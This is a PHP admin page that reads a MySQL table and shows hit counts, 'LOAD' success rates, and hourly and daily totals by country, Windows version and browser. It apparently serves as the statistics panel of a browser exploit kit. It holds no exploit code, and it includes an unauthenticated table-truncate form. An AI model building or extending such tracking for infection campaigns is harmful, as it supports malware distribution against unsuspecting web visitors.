<?php

	error_reporting(0);

	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Expires: Thu, 01 Jan 2000 00:00:00 GMT");
	header("Last-Modified:  Thu, 01 Jan 2000 00:00:00 GMT");
	header("Pragma: no-cache");

	@include("config.php");
	
	$BC = array(
		1 => "OPERA",
		2 => "MSIE",
		3 => "FFOX",
		4 => "FFOX",
		5 => "CHROME",
		6 => "OTHER"
	);

	$OS = array(
		 1 => "2K",
		 2 => "SP1",
		 3 => "SP2",
		 4 => "2K3",
		 5 => "VISTA",
		 6 => "OTHER"
	);

	$CN = array(
		0 => "OT", 1 => "AP", 2 => "EU", 3 => "AD", 4 => "AE", 5 => "AF", 
		6 => "AG", 7 => "AI", 8 => "AL", 9 => "AM", 10 => "AN", 11 => "AO", 
		12 => "AQ", 13 => "AR", 14 => "AS", 15 => "AT", 16 => "AU", 17 => "AW", 
		18 => "AZ", 19 => "BA", 20 => "BB", 21 => "BD", 22 => "BE", 23 => "BF", 
		24 => "BG", 25 => "BH", 26 => "BI", 27 => "BJ", 28 => "BM", 29 => "BN", 
		30 => "BO", 31 => "BR", 32 => "BS", 33 => "BT", 34 => "BV", 35 => "BW", 
		36 => "BY", 37 => "BZ", 38 => "CA", 39 => "CC", 40 => "CD", 41 => "CF", 
		42 => "CG", 43 => "CH", 44 => "CI", 45 => "CK", 46 => "CL", 47 => "CM", 
		48 => "CN", 49 => "CO", 50 => "CR", 51 => "CU", 52 => "CV", 53 => "CX", 
		54 => "CY", 55 => "CZ", 56 => "DE", 57 => "DJ", 58 => "DK", 59 => "DM", 
		60 => "DO", 61 => "DZ", 62 => "EC", 63 => "EE", 64 => "EG", 65 => "EH", 
		66 => "ER", 67 => "ES", 68 => "ET", 69 => "FI", 70 => "FJ", 71 => "FK", 
		72 => "FM", 73 => "FO", 74 => "FR", 75 => "FX", 76 => "GA", 77 => "GB",
		78 => "GD", 79 => "GE", 80 => "GF", 81 => "GH", 82 => "GI", 83 => "GL", 
		84 => "GM", 85 => "GN", 86 => "GP", 87 => "GQ", 88 => "GR", 89 => "GS", 
		90 => "GT", 91 => "GU", 92 => "GW", 93 => "GY", 94 => "HK", 95 => "HM", 
		96 => "HN", 97 => "HR", 98 => "HT", 99 => "HU", 100 => "ID", 101 => "IE", 
		102 => "IL", 103 => "IN", 104 => "IO", 105 => "IQ", 106 => "IR", 107 => "IS", 
		108 => "IT", 109 => "JM", 110 => "JO", 111 => "JP", 112 => "KE", 113 => "KG", 
		114 => "KH", 115 => "KI", 116 => "KM", 117 => "KN", 118 => "KP", 119 => "KR", 
		120 => "KW", 121 => "KY", 122 => "KZ", 123 => "LA", 124 => "LB", 125 => "LC", 
		126 => "LI", 127 => "LK", 128 => "LR", 129 => "LS", 130 => "LT", 131 => "LU", 
		132 => "LV", 133 => "LY", 134 => "MA", 135 => "MC", 136 => "MD", 137 => "MG", 
		138 => "MH", 139 => "MK", 140 => "ML", 141 => "MM", 142 => "MN", 143 => "MO", 
		144 => "MP", 145 => "MQ", 146 => "MR", 147 => "MS", 148 => "MT", 149 => "MU", 
		150 => "MV", 151 => "MW", 152 => "MX", 153 => "MY", 154 => "MZ", 155 => "NA",
		156 => "NC", 157 => "NE", 158 => "NF", 159 => "NG", 160 => "NI", 161 => "NL", 
		162 => "NO", 163 => "NP", 164 => "NR", 165 => "NU", 166 => "NZ", 167 => "OM", 
		168 => "PA", 169 => "PE", 170 => "PF", 171 => "PG", 172 => "PH", 173 => "PK", 
		174 => "PL", 175 => "PM", 176 => "PN", 177 => "PR", 178 => "PS", 179 => "PT", 
		180 => "PW", 181 => "PY", 182 => "QA", 183 => "RE", 184 => "RO", 185 => "RU", 
		186 => "RW", 187 => "SA", 188 => "SB", 189 => "SC", 190 => "SD", 191 => "SE", 
		192 => "SG", 193 => "SH", 194 => "SI", 195 => "SJ", 196 => "SK", 197 => "SL", 
		198 => "SM", 199 => "SN", 200 => "SO", 201 => "SR", 202 => "ST", 203 => "SV", 
		204 => "SY", 205 => "SZ", 206 => "TC", 207 => "TD", 208 => "TF", 209 => "TG", 
		210 => "TH", 211 => "TJ", 212 => "TK", 213 => "TM", 214 => "TN", 215 => "TO", 
		216 => "TL", 217 => "TR", 218 => "TT", 219 => "TV", 220 => "TW", 221 => "TZ", 
		222 => "UA", 223 => "UG", 224 => "UM", 225 => "US", 226 => "UY", 227 => "UZ", 
		228 => "VA", 229 => "VC", 230 => "VE", 231 => "VG", 232 => "VI", 233 => "VN",
		234 => "VU", 235 => "WF", 236 => "WS", 237 => "YE", 238 => "YT", 239 => "RS", 
		240 => "ZA", 241 => "ZM", 242 => "ME", 243 => "ZW", 244 => "A1", 245 => "A2", 
		246 => "O1", 247 => "AX", 248 => "GG", 249 => "IM", 250 => "JE", 251 => "BL",
		252 => "MF"
	);

	if (!($conid = mysql_connect($SQLHOST,$SQLLOGIN,$SQLPWD)))
		die("mysql_connect error");

	if (!mysql_select_db($SQLDB,$conid))
		die("mysql_select_db error");

	if( $_POST['reset']=="1")
		mysql_query( "TRUNCATE TABLE `".$TABLENAME."`", $conid);

	echo "
		<title>)':</title>
		<style>
		#a1{font-family:verdana;font-size:9px;color:#CC0099;font-weight:bold}
		#a2{font-family:verdana;font-size:9px;color:#333333;font-weight:bold}
		#a3{font-family:verdana;font-size:9px;color:#CC0099;}
		#a4{border:#333333 1px solid;color:#333333;font-size:9px;font-family: verdana;width:250;background-color: #000000}
		</style>
		<body bgcolor=#000000>
		<table width='390' align='center' cellpadding='0' cellspacing='1'>
		<tr><td colspan='7' align='center'><img src='logo.gif'></td></tr>
		<tr><td height='13' colspan='7'></td></tr>";

			echo "
			<tr height='13'>
				<td width='70' height='13'></td>
				<td id=a2 align='center' width='50'>&nbsp;ALL</td>
				<td id=a2 align='center' width='50'>&nbsp;LOAD</td>
				<td id=a2 align='center' width='50'>&nbsp;PER</td>
				<td id=a2 align='center' width='50'>&nbsp;HOUR</td>
				<td id=a2 align='center' width='50'>&nbsp;DAY</td>
				<td width='70' height='13'></td>
			</tr>
			<tr><td height='13' colspan='7'></td></tr>
			";

	if ($r = mysql_query("
		SELECT
		cn,
		sum(1) as ac,
		sum(ok = '1') as gc,
		(sum(ok = '1') / sum(1)) * 100 as pc,
		sum((unix_timestamp() - ti) < 3600) as hc,
		sum((unix_timestamp() - ti) < (3600 * 24)) as dc
		FROM ".$TABLENAME."
		GROUP BY cn 
		ORDER BY ac 
		DESC LIMIT 0,10",
		$conid)) {
			while (($a = mysql_fetch_array($r))) {
				$pc = str_replace("100.","100",substr($a['pc'],0,4));
				$cn = $CN[$a['cn']];
				if (empty($cn)) $cn = "*OT";
				echo "
			<tr height='13'>
				<td id=a2 align='left' width='70' height='13'>".$cn."</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['ac']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['gc']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$pc."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['hc']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['dc']."&nbsp;</td>
				<td width='70' height='13'></td>
			</tr>
			";
			}
			echo "
			<tr height='13'>
				<td id=a3 colspan='6' align='right'>* other country</td>
				<td width='50'></td>
			</tr>";
	}

	if ($r = mysql_query("
		SELECT
		os,
		sum(1) as ao,
		sum(ok = '1') as gs,
		(sum(ok = '1') / sum(1)) * 100 as ps,
		sum((unix_timestamp() - ti) < 3600) as hs,
		sum((unix_timestamp() - ti) < (3600 * 24)) as ds
		FROM ".$TABLENAME."
		GROUP BY os 
		ORDER BY ao 
		DESC LIMIT 0,10",
		$conid)) {
			while (($a = mysql_fetch_array($r))) {
				$ps = str_replace("100.","100",substr($a['ps'],0,4));
				$os = $OS[$a['os']];
				if (empty($os)) $os = "OTHER";
				echo "
			<tr height='13'>
				<td id=a2 align='left' width='70' height='13'>".$os."</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['ao']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['gs']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$ps."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['hs']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['ds']."&nbsp;</td>
				<td width='70' height='13'></td>

				
			</tr>
			";
			}
			echo "<tr><td height='13' colspan='7'></td></tr>";
	}

	if ($r = mysql_query("
		SELECT
		br,
		sum(1) as ab,
		sum(ok = '1') as gb,
		(sum(ok = '1') / sum(1)) * 100 as pb,
		sum((unix_timestamp() - ti) < 3600) as hb,
		sum((unix_timestamp() - ti) < (3600 * 24)) as db
		FROM ".$TABLENAME."
		GROUP BY br 
		ORDER BY ab 
		DESC LIMIT 0,10",
		$conid)) {
			while (($a = mysql_fetch_array($r))) {
				$pb = str_replace("100.","100",substr($a['pb'],0,4));
				$br = $BC[$a['br']];
				if (empty($br)) $br = "OTHER";
				echo "
			<tr height='13'>
				<td width='70' height='13'></td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['ab']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['gb']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$pb."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['hb']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['db']."&nbsp;</td>
				<td id=a2 align='right' width='70' height='13'>".$br."</td>
			</tr>
			";
			}
			echo "<tr><td height='13' colspan='7'></td></tr>";
	}

	if ($r = mysql_query("
		SELECT DISTINCT br,ma,mi
		FROM ".$TABLENAME."
		ORDER BY br",
		$conid)) {

			while (($a = mysql_fetch_array($r))) {
				$br = $BC[$a['br']]." ".$a['ma'].".".$a['mi'];
				if ($a['br'] == 4) $br = "OTHER";
				$g = mysql_query("
				SELECT 
				sum(1) as ab,
				sum(ok = '1') as gb,
				(sum(ok = '1') / sum(1)) * 100 as pb,
				sum((unix_timestamp() - ti) < 3600) as hb,
				sum((unix_timestamp() - ti) < (3600 * 24)) as db
				FROM ".$TABLENAME."
				WHERE br = '".$a['br']."' AND ma = '".$a['ma']."' AND mi = '".$a['mi']."'");
				$d = mysql_fetch_array($g);
				$pb = str_replace("100.","100",substr($d['pb'],0,4));

				echo "
			<tr height='13'>
				<td width='70' height='13'></td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$d['ab']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$d['gb']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$pb."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$d['hb']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$d['db']."&nbsp;</td>
				<td id=a2 align='right' width='70' height='13'>".$br."</td>
			</tr>
			";
			}
			echo "<tr><td height='13' colspan='7'></td></tr>";
	}

/*	if ($r = mysql_query("
		SELECT
		sp,
		sum(ok = '1') as gs,
		sum((unix_timestamp() - ti) < 3600) as hs,
		sum((unix_timestamp() - ti) < (3600 * 24)) as ds
		FROM ".$TABLENAME."
		WHERE sp <> 0
		GROUP BY sp 
		ORDER BY gs
		DESC",
		$conid)) {
			while (($a = mysql_fetch_array($r))) {
//				$br = $SPL[$a['sp']];
				echo "
			<tr height='13'>
				<td width='70' height='13'></td>
				<td id=a1 bgcolor='#222222' align='right' width='50'></td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['gs']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'></td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['hs']."&nbsp;</td>
				<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['ds']."&nbsp;</td>
				<td id=a2 align='right' width='70' height='13'>".$a['sp']."</td>
			</tr>
			";
			}
			echo "<tr><td height='13' colspan='7'></td></tr>";
	}*/

	if ($r = mysql_query("
		SELECT
		sum(1) as aa,
		sum(ok = '1') as ga,
		(sum(ok = '1') / sum(1)) * 100 as pa,
		sum((unix_timestamp() - ti) < 3600) as ha,
		sum((unix_timestamp() - ti) < (3600 * 24)) as da
		FROM ".$TABLENAME."
		ORDER BY aa",
		$conid)) {
			if($a = mysql_fetch_array($r)) {
				$pa = str_replace("100.","100",substr($a['pa'],0,4));
				echo "
				<tr height='13'>
					<td width='70' height='13'></td>
					<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['aa']."&nbsp;</td>
					<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['ga']."&nbsp;</td>
					<td id=a1 bgcolor='#222222' align='right' width='50'>".$pa."&nbsp;</td>
					<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['ha']."&nbsp;</td>
					<td id=a1 bgcolor='#222222' align='right' width='50'>".$a['da']."&nbsp;</td>
					<td id=a2 align='right' width='70' height='13'>ALL&nbsp;</td>
				</tr>
				";
			}
		
	}
			echo "
			<tr><td height='13' colspan='7'></td></tr>
			<tr height='13'>
			<td></td>
			<td id=a3 colspan='5' align='center'>
			<form action='admin.php' method='post'>
				<input type='hidden' name='reset' value='1'>
				<input type='submit' name='button' value='TRUNCATE' id=a4>
			</form>
			</td>
			<td></td>
			</tr></table></body>";


?>
